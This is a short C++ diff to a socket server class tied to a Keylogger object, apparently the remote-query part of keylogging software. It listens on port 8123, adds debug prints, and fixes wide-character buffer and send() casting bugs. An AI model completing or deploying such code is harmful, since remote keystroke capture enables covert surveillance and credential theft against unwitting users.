@@ -51,7 +51,7 @@ SocketServer::SocketServer(Keylogger* logger) {
 	hints.ai_flags = AI_PASSIVE;
 
 	this->initHostInfo();
-	//std::cout << this->ip << " " << this->hostName << std::endl;
+	std::wcout << StringUtilities::s2ws(this->ip) << L" " << StringUtilities::s2ws(this->hostName) << std::endl;
 
 	result = getaddrinfo(ip.c_str(), "8123", &hints, &addr);
 
@@ -83,6 +83,8 @@ void SocketServer::start() {
 	if (this->listenSocket == INVALID_SOCKET) {
 		cerr << "socket is not active" << std::endl;
 		return;
+	} else {
+		std::wcout << "socket active" << std::endl;
 	}
 
 	wchar_t requestBuffer[SOCKET_BUFFER_SIZE];
@@ -111,13 +113,13 @@ void SocketServer::start() {
 			} else if (receivedSize == 0) {
 				cerr << "connection closed..." << std::endl;
 			} else if (receivedSize > 0) {
-				requestBuffer[receivedSize] = '\0';
+				requestBuffer[receivedSize / 2] = '\0';
 				std::wstring request = std::wstring(requestBuffer);
 				std::wcout << L"received: " << request << std::endl;
 
 				response = this->getResponse(request);
 
-				int sendResult = send(clientSocket, (char*) * response.c_str(),
+				int sendResult = send(clientSocket, (char*)response.c_str(),
 					sizeof(wchar_t) * response.size(), 0);
 
 				if (request.compare(L"exit") == 0) {
